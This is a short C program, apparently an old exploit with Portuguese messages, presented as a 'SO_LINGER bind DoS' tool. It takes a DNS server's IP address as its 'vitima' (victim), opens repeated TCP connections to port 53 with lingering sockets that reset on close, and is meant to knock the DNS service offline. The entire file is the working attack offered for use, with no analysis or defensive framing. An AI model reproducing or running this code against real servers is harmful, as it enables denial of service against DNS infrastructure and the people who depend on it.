#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

#define DNS 53
#define REVER 10

int main(int argc, char **argv) {
 struct linger l1ng3r;
 int sock, conector, i;
 struct sockaddr_in vitima;

 if(argc != 2) {
  printf("uso: %s <ip_do_dns>\n",argv[0]);
  exit(0);
 }
 printf("unbind - SO_LINGER bind DoS (c)\n");
 printf("enviando p/ %s: \n",argv[1]);
 fflush(0);
 for(i=0;i<REVER;i++) {
  sock = socket(AF_INET, SOCK_STREAM, 0);
  l1ng3r.l_onoff = 1;
  if(setsockopt(sock,SOL_SOCKET,SO_LINGER,(void *)&l1ng3r,sizeof(l1ng3r))<0) {
   perror("setsockopt");
   exit(0);
  }
  vitima.sin_family = AF_INET;
  vitima.sin_port = htons(DNS);
  vitima.sin_addr.s_addr = inet_addr(argv[1]);
  if(vitima.sin_addr.s_addr == -1) {
   printf("invalido ip: '%s'!\n",argv[1]);
   exit(0);
  }
  bzero(&vitima.sin_zero,8);
  conector = connect(sock, (struct sockaddr *)&vitima,sizeof(struct sockaddr));
  if(conector == 0) {
   printf(".");
  }
  close(sock);
  fflush(0);
 }
 printf("Aguarde!\n");
 return 0;
}
